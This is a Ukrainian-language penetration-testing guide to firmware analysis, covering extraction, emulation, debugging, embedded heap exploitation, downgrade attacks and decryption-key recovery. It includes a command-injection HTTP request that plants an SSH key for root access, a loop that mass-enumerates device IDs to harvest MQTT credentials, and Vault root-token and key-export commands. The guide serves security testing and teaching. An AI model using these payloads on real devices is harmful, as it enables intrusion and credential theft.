# Аналіз Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Вступ**

### Пов'язані ресурси

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware — це критично важливе програмне забезпечення, яке забезпечує коректну роботу пристроїв, керуючи та забезпечуючи взаємодію між апаратними компонентами й програмним забезпеченням, з яким взаємодіють користувачі. Воно зберігається в постійній пам'яті, завдяки чому пристрій може отримати доступ до життєво важливих інструкцій одразу після ввімкнення, що зрештою призводить до запуску операційної системи. Дослідження та потенційна модифікація firmware є критично важливим етапом виявлення security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — це критично важливий початковий етап для розуміння складу пристрою та технологій, які він використовує. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Специфіку bootloader
- Апаратну структуру та datasheets
- Метрики codebase і розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікації
- Архітектурні діаграми та діаграми потоків
- Security assessments і виявлені вразливості

Для цього **open-source intelligence (OSINT)** tools є надзвичайно цінними, так само як і аналіз будь-яких доступних компонентів open-source software за допомогою ручних та automated review processes. Такі tools, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний static analysis, який можна використати для пошуку потенційних проблем.

## **Отримання Firmware**

Отримати firmware можна різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** з джерела (developers, manufacturers)
- **Зібравши** його за наданими інструкціями
- **Завантаживши** з офіційних сайтів підтримки
- Використовуючи запити **Google dork** для пошуку розміщених файлів firmware
- Отримуючи прямий доступ до **cloud storage** за допомогою tools на кшталт [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплюючи **оновлення** за допомогою man-in-the-middle techniques
- **Витягуючи** його з пристрою через такі підключення, як **UART**, **JTAG** або **PICit**
- **Перехоплюючи** запити на оновлення під час комунікації пристрою
- Виявляючи та використовуючи **hardcoded update endpoints**
- **Створюючи dump** із bootloader або мережі
- **Виймаючи та зчитуючи** мікросхему пам'яті, якщо всі інші способи не спрацювали, за допомогою відповідних hardware tools

### Логи лише через UART: примусово отримати root shell через U-Boot env у flash

Якщо RX UART ігнорується (відображаються лише логи), ви все одно можете примусово запустити init shell, **відредагувавши blob середовища U-Boot** offline:<sup>[[6]](#references)</sup>

1. Створіть dump SPI flash за допомогою SOIC-8 clip і programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть розділ U-Boot env, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте U-Boot env CRC32** для blob.
3. Прошийте лише розділ env і перезавантажте пристрій; у UART має з'явитися shell.

Це корисно для embedded devices, де shell bootloader вимкнено, але до розділу env можна отримати доступ для запису через зовнішній доступ до flash.

## Аналіз firmware

Тепер, коли ви **маєте firmware**, потрібно витягти з нього інформацію, щоб зрозуміти, як із ним працювати. Для цього можна використовувати різні tools:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих інструментів не вдалося знайти багато інформації, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька, то, ймовірно, він не зашифрований. Якщо ентропія висока, то, ймовірно, він зашифрований (або певним чином стиснений).

Крім того, ви можете використовувати ці інструменти для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для перевірки файлу.

### Отримання файлової системи

За допомогою згаданих вище інструментів, наприклад `binwalk -ev <bin>`, ви мали б змогу **вилучити файлову систему**.\
Binwalk зазвичай вилучає її в **папку, названу за типом файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне вилучення файлової системи

Іноді binwalk **не має magic byte файлової системи у своїх сигнатурах**. У таких випадках використовуйте binwalk, щоб **знайти зміщення файлової системи та вирізати стиснену файлову систему** з бінарного файлу, а потім **вручну вилучіть** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть наведену нижче **dd command**, щоб виконати carving файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, можна також виконати наведену нижче команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо розібрати його для розуміння структури та потенційних вразливостей. Цей процес передбачає використання різних інструментів для аналізу та вилучення цінних даних з образу firmware.

### Інструменти первинного аналізу

Нижче наведено набір команд для первинної перевірки бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, вилучити strings, проаналізувати бінарні дані та зрозуміти структуру розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендовано використовувати такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог із назвою її типу (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутність magic bytes, необхідне ручне вилучення. Воно передбачає використання `binwalk` для визначення зміщення файлової системи, після чого команда `dd` використовується для вилучення файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовуються різні команди.

### Аналіз файлової системи

Після вилучення файлової системи починається пошук вразливостей безпеки. Особлива увага приділяється небезпечним мережевим daemon-ам, hardcoded обліковим даним, API endpoints, функціональності update server, некомпільованому коду, startup scripts і скомпільованим binaries для offline analysis.

**Ключові розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** для пошуку облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та scripts на наявність потенційних вразливостей
- Вбудовані binaries для подальшого аналізу
- Поширені web servers і binaries IoT-пристроїв

Кілька інструментів допомагають виявити конфіденційну інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static і dynamic analysis

### Перевірки безпеки скомпільованих binaries

І вихідний код, і скомпільовані binaries, знайдені у файловій системі, необхідно ретельно перевірити на наявність вразливостей. Такі інструменти, як **checksec.sh** для Unix binaries і **PESecurity** для Windows binaries, допомагають виявити незахищені binaries, які можуть бути експлуатовані.

## Отримання cloud config і MQTT credentials через похідні URL tokens

Багато IoT hubs отримують конфігурацію для кожного пристрою з cloud endpoint, який має вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально обчислюється з device ID за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді uppercase hex

Ця конструкція дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відтворити URL і отримати cloud config, часто розкриваючи plaintext MQTT credentials і topic prefixes.

Практичний workflow:

1) Витягнути deviceId із UART boot logs

- Підключити 3.3V UART adapter (TX/RX/GND) і перехопити logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять шаблон URL конфігурації cloud і адресу broker, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновіть STATIC_KEY і алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 і виконайте пошук шляху до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Виведіть токен у Bash і переведіть digest у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Зберіть cloud-конфігурацію та облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; обробіть його за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживайте plaintext MQTT і слабкими ACLs для topic (якщо доступні)

- Використовуйте відновлені облікові дані, щоб підписатися на topic обслуговування та шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перераховуйте передбачувані ID пристроїв (у великому масштабі, з авторизацією)

- Багато екосистем вбудовують байти OUI/продукту/типу постачальника, за якими йде послідовний суфікс.
- Ви можете перебирати можливі ID, програмно отримувати токени та завантажувати конфігурації:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Нотатки
- Завжди отримуйте явний дозвіл перед спробами масового перерахування.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Цей підхід може зіткнутися з проблемами, пов’язаними із залежностями від обладнання чи архітектури, але перенесення root filesystem або окремих бінарних файлів на пристрій із відповідною архітектурою та endianness, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може сприяти подальшому тестуванню.

### Емуляція окремих бінарних файлів

Для аналізу окремих програм надзвичайно важливо визначити endianness і CPU architecture програми.

#### Приклад з архітектурою MIPS

Щоб емуляувати бінарний файл архітектури MIPS, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарних файлів слід використовувати `qemu-mipsel`.

#### Емуляція ARM Architecture

Для ARM-бінарних файлів процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизуючи цей процес і допомагаючи у dynamic analysis.

## Практичне застосування Dynamic Analysis

На цьому етапі для analysis використовується або реальне, або емульоване середовище пристрою. Важливо зберігати доступ до shell операційної системи та файлової системи. Емуляція може неточно відтворювати взаємодію з hardware, через що іноді виникає потреба перезапускати емуляцію. Під час analysis слід повторно перевірити файлову систему, експлуатувати доступні вебсторінки та мережеві сервіси, а також досліджувати вразливості bootloader. Тести цілісності firmware мають критичне значення для виявлення потенційних backdoor-вразливостей.

## Методи Runtime Analysis

Runtime analysis передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі за допомогою таких інструментів, як gdb-multiarch, Frida та Ghidra, для встановлення breakpoint і виявлення вразливостей через fuzzing та інші методи.

Для embedded targets без повноцінного debugger **скопіюйте статично скомпонований `gdbserver`** на пристрій і під'єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / mapping радіо-ко-процесорних повідомлень

В IoT-хабах RF stack часто розділений між **radio MCU** і процесом Linux userland. Корисний workflow полягає в mapping такого шляху:<sup>[[8]](#references)</sup>

1. **RF frame** у радіоефірі
2. **parser на стороні controller** у radio MCU
3. **текстовий serial/UART або TLV protocol**, переданий до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** в основному daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює дві цілі для reversing замість однієї. Якщо controller перетворює binary radio frames на текстовий protocol на кшталт `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які messages можуть надходити з **network**, а які — безпосередньо від controller
- Точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers доступні лише під час **commissioning**, discovery або firmware/model download phases

Для Zigbee capture pairing traffic і перевірте, чи target досі покладається на default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цей ризик, тому зафіксуйте, чи тестований device фактично їх enforce-ить.

### Manufacturer-specific protocol handlers і FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж standardized clusters, оскільки вони передають дані до **custom parsing code** та внутрішніх **FSMs** із менш перевіреною validation.<sup>[[8]](#references)</sup>

Практичний workflow:

- Виконуйте reverse command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, які автоматично переходять далі, а також retry/error branches, які зрештою reset-ять або free-ять state, контрольований attacker-ом.
- Підтвердьте, які легітимні protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди reachable.

Для timing-sensitive protocols packet replay із Python framework може бути надто повільним. Надійніший підхід полягає в emulation легітимного device на реальному hardware (наприклад **nRF52840**) із vendor-grade stack, щоб можна було надати правильні **endpoints**, **attributes** і timing commissioning.

### Клас fragmented-download bugs в embedded daemons

Повторюваний клас firmware bugs виникає у **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0)` зберігає `ctx->total_size` і викликає `malloc(total_size)`.
2. Наступні fragments перевіряють лише attacker-controlled **packet-local** fields, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **original allocated size**.

Це дає attacker-у змогу надіслати:

- Перший valid fragment із **малим** declared total size, щоб примусити small heap allocation.
- Наступний fragment із **очікуваним offset**, але більшим `chunk_len`.
- Forged packet-local size, який проходить свіжі checks, водночас переповнюючи спочатку allocated buffer.

Якщо vulnerable path захищений commissioning logic, exploitation має включати достатню **device emulation**, щоб перевести target у очікуваний стан model-download або blob-download перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростішим способом trigger-нути heap metadata exploitation часто є не "wait for cleanup", а **примусити protocol використовувати власну error handling**:<sup>[[8]](#references)</sup>

- Надішліть malformed follow-up fragments, щоб перевести FSM у **retry** або **error** states.
- Перевищте retry threshold, щоб daemon **reset-нув context** і free-нув corrupted buffer.
- Використайте цей передбачуваний `free()` для trigger allocator-side primitives до того, як process crash-неться з інших причин.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де corruption chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний pattern полягає в corruption **size field**, щоб перенаправити allocator traversal до **fake chunks**, підготовлених усередині overflowed buffer, замість негайного перезапису реальних bin pointers і crash процесу.

## Binary Exploitation and Proof-of-Concept

Розроблення PoC для виявлених vulnerabilities потребує глибокого розуміння architecture target-а та programming мовами нижчого рівня. Binary runtime protections в embedded systems трапляються рідко, але коли вони присутні, можуть знадобитися techniques на кшталт Return Oriented Programming (ROP).

### Нотатки щодо uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніший large allocation може trigger-нути `__malloc_consolidate()`, тому будь-який fake chunk має пройти checks (sane size, `fd = 0` і сусідні chunks мають сприйматися як "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але main binary є **non-PIE**, адреси in-binary `.data/.bss` залишаються стабільними. Можна націлитися на region, який уже нагадує valid heap chunk header, щоб розмістити fastbin allocation у **function pointer table**.
- **Parser-stopping NUL:** коли виконується parsing JSON, `\x00` у payload може зупинити parsing, зберігаючи trailing attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, яка викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити executable shellcode у відомому mapping і перейти до нього.

## Підготовлені Operating Systems для Firmware Analysis

Operating systems на кшталт [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS) надають попередньо налаштовані environments для firmware security testing, оснащені необхідними tools.

## Підготовлені OSs для аналізу Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — це distro, призначений для security assessment і penetration testing Internet of Things (IoT) devices. Він значно економить час, надаючи попередньо налаштований environment із завантаженими всіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system на базі Ubuntu 18.04, попередньо оснащений tools для firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor реалізує cryptographic signature checks для firmware images, **version rollback (downgrade) protection часто відсутній**. Якщо boot- або recovery-loader лише перевіряє signature за допомогою embedded public key, але не порівнює *version* (або monotonic counter) image, який прошивається, attacker може легітимно встановити **старішу vulnerable firmware, яка все ще має valid signature**, і таким чином повторно активувати patched vulnerabilities.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Отримайте старішу signed image**
* Завантажте її з public download portal, CDN або support site vendor-а.
* Витягніть її з companion mobile/desktop applications (наприклад, з `assets/firmware/` усередині Android APK).
* Отримайте її зі third-party repositories, таких як VirusTotal, Internet archives, forums тощо.
2. **Upload-ніть або подайте image на device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато consumer IoT devices expose-ять *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх server-side і trigger-ять recovery/upgrade.
3. Після downgrade exploit-ніть vulnerability, яку було patched у новішому release (наприклад, command-injection filter, доданий пізніше).
4. За потреби прошийте latest image назад або disable-ніть updates, щоб уникнути detection після отримання persistence.

### Приклад: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) версії прошивки параметр `md5` безпосередньо конкатенується в shell-команду без санітизації, що дає змогу ін'єктувати довільні команди (у цьому випадку — увімкнути доступ `root` через SSH-ключ). У пізніших версіях прошивки було додано базовий фільтр символів, але відсутність захисту від downgrade робить це виправлення марним.<sup>[[4]](#references)</sup>

### Витягування прошивки з мобільних застосунків

Багато виробників вбудовують повні образи прошивки у свої супутні мобільні застосунки, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються без шифрування в APK/APEX за такими шляхами, як `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягувати підписані образи без фізичного доступу до обладнання.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Обхід anti-rollback, реалізований лише в updater, у дизайнах зі слотами A/B

Деякі vendors реалізують **ratchet** для захисту від downgrade, але лише всередині логіки *updater* (наприклад, у routine UDS через CAN, recovery command або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише signature/CRC і довіряє partition table або slot metadata, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типовий слабкий дизайн:

- Firmware metadata містить як дескриптор версії, так і **security ratchet** / монотонний counter.
- Updater порівнює ratchet образу зі значенням, збереженим у persistent storage, і відхиляє старіші підписані образи.
- **Bootloader** не аналізує цей ratchet і перед boot перевіряє лише header, CRC та signature вибраного slot.
- Активація slot зберігається окремо в partition table або per-slot generation counter і **криптографічно не пов’язана** з точним firmware digest, який пройшов validation.

Це створює primitive **validate-one-image / boot-another-image** у dual-slot системах. Якщо attacker може змусити updater позначити slot B як наступну ціль для boot, використовуючи поточний підписаний образ, а потім перезаписати slot B до reboot, bootloader усе ще може завантажити downgraded image, оскільки він довіряє лише вже зафіксованій slot metadata.

Поширений патерн зловживання:

1. Завантажити **current signed** firmware у пасивний slot і виконати стандартну validation/switch routine, щоб layout позначив цей slot як наступний активний.
2. **Поки що не виконувати reboot**. У тій самій session повторно увійти в slot-preparation/erase routine.
3. Використати stale boot-state або stale slot-selection logic, щоб updater стер **той самий physical slot**, який щойно було promoted.
4. Записати в цей slot **старішу, але все ще підписану** firmware.
5. Пропустити validation routine, яка застосовує ratchet, і безпосередньо виконати reboot.
6. Bootloader вибирає promoted slot, перевіряє лише signature/integrity і завантажує старий image.

Під час reverse engineering реалізацій A/B update слід шукати:

- Вибір slot, отриманий із **boot-time flags**, які не оновлюються після успішного switch.
- Routine на кшталт `prepare_passive_slot()`, яка стирає slot на основі stale state, а не **поточного зафіксованого layout**.
- Function на кшталт `part_write_layout()`, яка лише збільшує **generation counter** / active flag і не зберігає hash перевіреного image.
- Перевірки ratchet, реалізовані в userspace або updater code, але **відсутні в ROM / bootloader / secure boot stages**.
- Erase або recovery routines, які залишають slot позначеним як bootable навіть після видалення та повторного запису його вмісту.

### Checklist для оцінювання логіки update

* Чи достатньо захищені transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **monotonic anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи **bootloader застосовує той самий ratchet**, що й updater, замість перевірки лише signature/CRC?
* Чи **slot activation metadata пов’язана** з validated firmware digest/version, чи slot можна змінити після promotion?
* Після успішного switch slot чи device примусово виконує reboot, або наступні update/erase routines усе ще доступні в тій самій session?
* Чи виконує userland code додаткові sanity checks (наприклад, дозволену partition map, model number)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡  Якщо будь-який із наведених пунктів відсутній, platform, імовірно, вразлива до rollback attacks.

## Вразлива firmware для практики

Щоб практикувати пошук вразливостей у firmware, використовуйте наведені нижче проєкти вразливої firmware як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Відновлення ключів розшифрування firmware зі стану embedded KMS/Vault

Коли update image поєднує невеликі plaintext metadata з великим blob із високою ентропією, перед brute-forcing виконайте triage контейнера:<sup>[[1]](#references)</sup>

- Виведіть headers, offsets і межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` та `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 bytes є salt, а решта — ciphertext.
- Base64 field, декодований рівно у `256` bytes, є вагомою ознакою того, що ви маєте справу з RSA-2048 ciphertext, який обгортає random firmware password/session key.
- Detached PGP material у тому самому файлі часто захищає лише authenticity; не вважайте, що це механізм confidentiality.

Якщо static key hunting (`grep`, `strings`, пошук PEM/PGP) не дає результату, виконуйте reverse engineering **operational decrypt path**, а не лише пошук private keys:

- Decompile updater / management binary і простежте, хто читає encrypted blob, який helper/API його unwraps і яке logical key name він запитує.
- Виконайте пошук у витягнутій root filesystem за KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit files та init scripts.
- Розглядайте plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens або local KMS auto-unseal scripts як еквівалент private-key material.

Якщо appliance постачається з оригінальним Vault binary та storage backend, відтворити це environment зазвичай простіше, ніж повторно реалізовувати внутрішні механізми Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Маючи root на клонованому KMS:

- Зробіть transit keys експортованими лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте unwrap key: `vault read transit/export/encryption-key/<name>`
- Спробуйте відновлений RSA key із точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала стандартна розшифровка OAEP **не** доводять, що key неправильний; багато потоків на базі Vault використовують OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від постачальника (`EVP_BytesToKey`, часто MD5 на legacy appliances), перш ніж виконувати розшифровку AES-CBC.

Це перетворює проблему «encrypted firmware» на більш загальну: **відновіть operational keys на стороні appliance, а потім офлайн відтворіть точні параметри unwrap + KDF**.

## Навчання та сертифікації

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Злам firmware за допомогою Claude: навички senior-рівня, автономність junior-рівня](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Методологія тестування безпеки firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Практичний IoT Hacking: остаточний посібник з атак на Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Експлуатація zero days у занедбаному hardware — блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Як Smart Device за $20 надав мені доступ до вашого дому](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Тепер ви бачите mi: тепер ви Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
